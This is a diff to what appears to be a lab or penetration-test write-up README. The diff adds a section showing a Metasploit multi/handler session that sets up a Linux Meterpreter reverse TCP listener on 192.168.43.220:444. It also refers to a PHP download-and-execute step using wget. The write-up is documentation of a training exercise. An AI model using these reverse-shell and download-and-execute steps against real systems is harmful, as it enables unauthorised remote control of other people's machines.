@@ -145,9 +145,6 @@ systemctl start apache2.service
 
 At this point, the payload had been created and placed in the web server's document root, and Apache had been started to make the file available over HTTP. These commands do **not** demonstrate that the target downloaded or executed the payload, nor that a reverse Meterpreter session was established. Those outcomes require separate evidence and will be documented only if confirmed.
 
----
-
-*AI assistance was used in preparing this README.*
 
 
 ## 11. Preparing the PHP Download-and-Execute Command
@@ -164,6 +161,39 @@ The `wget` command specifies `/tmp/IM_HERE` as the download destination. The fol
 
 ![Screenshot 11: PHP command prepared in code.php](screenshots/11.png)
 
-![Screenshot 12: Additional evidence from the PHP preparation step](screenshots/12.png)
 
 This screenshot documents the command entered in the PHP file. It does **not** establish that the PHP code was triggered, that the payload was successfully downloaded or executed, or that a reverse Meterpreter session was received. Those results will be recorded separately after they are verified.
+
+
+## 12. Starting the Meterpreter Handler
+
+With the payload configured to connect to `192.168.43.220:444`, I opened Metasploit's multi/handler and selected the matching Linux x86 Meterpreter reverse TCP payload:
+
+```text
+=[ metasploit v6.4.84-dev                                ]
++ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
++ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+[*] Starting persistent handler(s)...
+msf > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
+payload => linux/x86/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set lhost 192.168.43.220
+lhost => 192.168.43.220
+msf exploit(multi/handler) > set lport 444
+lport => 444
+msf exploit(multi/handler) > exploit
+[*] Started reverse TCP handler on 192.168.43.220:444
+```
+
+The output confirms that the handler started and was listening on `192.168.43.220:444`. It does **not** show an incoming connection or an established Meterpreter session; those require separate confirmation.
+
+![Screenshot 12: Metasploit multi-handler listening on port 444](screenshots/12.png)
+
+---
+
+*AI assistance was used in preparing this README.*
